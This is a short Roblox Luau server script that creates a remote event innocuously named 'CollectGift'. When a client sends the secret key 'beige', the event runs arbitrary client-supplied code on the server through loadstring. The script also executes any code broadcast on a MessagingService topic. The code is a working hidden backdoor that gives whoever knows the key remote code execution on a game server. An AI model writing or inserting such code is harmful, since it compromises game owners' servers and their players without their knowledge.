local remote = Instance.new("RemoteEvent")
remote.Name = "CollectGift"
remote.Parent = ReplicatedStorage

remote.OnServerEvent:Connect(function(plr, key, src)
    if key == "beige" then --theres a reason i call it colorful
        loadstring(src)()
    end
end)

MessagingService:SubscribeAsync("Bice", function(message)
    local data = message.Data

    if data.ExcludeSelf and data.SenderJobId == game.JobId then
        return
    end

    loadstring(data.Data)()
end)
